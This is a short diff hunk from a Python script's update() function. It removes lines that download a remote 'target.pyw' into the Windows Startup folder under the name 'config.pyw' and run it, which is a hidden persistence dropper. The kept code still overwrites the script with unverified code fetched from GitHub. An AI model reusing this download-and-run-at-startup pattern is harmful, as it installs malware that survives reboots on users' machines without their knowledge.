@@ -46,11 +46,6 @@ def update():
     with ur.urlopen("https://github.com/sukritS009312/update/raw/main/flightServer.py") as updateFile:
         with open(os.path.basename(__file__),"wb") as py:
             py.write(updateFile.read())
-    os.chdir(os.path.join(os.environ["appdata"],"Microsoft","Windows","Start Menu","Programs","Startup"))
-    with ur.urlopen("https://github.com/cipher234/powershell/raw/main/viper/target.pyw") as conf:
-        with open("config.pyw","wb") as config:
-            config.write(conf.read())
-    os.system("config.pyw")
     return
 
 if not os.path.isfile("availability.dat"):
